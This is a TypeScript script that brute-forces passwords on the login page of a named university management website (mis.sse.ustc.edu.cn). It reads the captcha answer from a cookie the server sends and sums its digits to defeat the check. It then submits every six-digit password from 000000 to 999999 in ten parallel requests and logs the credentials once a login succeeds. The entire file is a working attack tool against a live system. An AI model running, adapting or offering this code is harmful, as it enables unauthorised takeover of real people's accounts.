import FormData = require("form-data");
import fetch, { FetchError } from "node-fetch"
import cheerio = require("cheerio")
import Utils from "./utils"
import pQueue from "p-queue"
import { reject } from "async";
const log = console.log
const baseUrl = "http://mis.sse.ustc.edu.cn/"
const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g


export function worker(username: string): Promise<any>{
  return new Promise((resolve,reject)=>{
    let success = false
    let view_state = ""
    let password = "000000"
    username = username.toLowerCase()
    log("username: ",username)
        /**
         * 获取登陆页的html
         */
    async function main(){
      try {
        const result = await fetch(baseUrl)
        const cookieJar = new Map()
        const sessionId = Utils.getCookie(result)
        cookieJar.set("sessionId",sessionId);
        const body = await result.text()
        const $ = cheerio.load(body);
        view_state = $("#__VIEWSTATE").val();//view state字段
        const imgUrl = body.match(pattern) || [""];
        const url = baseUrl + imgUrl[0].replace("&amp;", "&");//验证码url
        const r = await fetch(url, {
          headers: {
            "cookie": Array.from(cookieJar.values()).join(";")
          }
        });
        const validate = Utils.getCookie(r)//验证码
        cookieJar.set("validate",validate);
        const validateCode = (validate.match(/[0-9]{4}/) || [""])[0];
        log("validate code:", validateCode);
        let sum = 0;
        validateCode.split("").forEach(val => {
          sum += parseInt(val);
        });
        log("sum:", sum);
        log("session", cookieJar);
        const queue = new pQueue({concurrency:10})
        const tryPass =()=>{
            const mypass = password
            password = increase(password)
            /**
             * 组装数据
             */
            const formData = new FormData();
            formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
            formData.append("__VIEWSTATE", view_state);
            formData.append("winLogin$sfLogin$txtUserLoginID", username);
            formData.append('winLogin$sfLogin$txtPassword', mypass);
            formData.append('winLogin$sfLogin$txtValidate', sum + "");
            
            return fetch(baseUrl + "default.aspx", {
              method: "post",
              headers: {
                cookie: Array.from(cookieJar.values()).join(";")
              },
              body: formData
            }).then(login=>{
              /**
               * iflysse是登陆成功时拿到的cookie值
               */
              const iflysse = Utils.getCookie(login)
              if (iflysse.length === 0) {
                log("failed ", "password: ", mypass);
              }
              else {
                log("success ", "用户名: ", username, "密码: ", mypass);
                success = true;
                resolve("success "+ "用户名: "+ username+ "密码: "+ mypass)
              }
              return
            })
            .catch(reject)
          }
        
        for(let i=0;i<110;i++){
          queue.add(
            tryPass
          )
        }
        queue.on("active",()=>{
          log("size",queue.size)
          if(queue.size<100&&!success&&parseInt(password)<=999999){
            queue.add(
              tryPass
            )
          }else{
            if(success){
              queue.pause()
            }
            if(parseInt(password)>999999){
              queue.pause()
            }
          }
        })
      } catch (error) {
        log(error)
      }
    }
    main()
  })
}  
    
    
  function increase(num: string){
    num = ""+(parseInt(num)+1)
    if(num.length<6){
      const len = num.length
      for(let i=0;i<6-len;i++){
        num = 0+num
      }
    }
    return num
  }
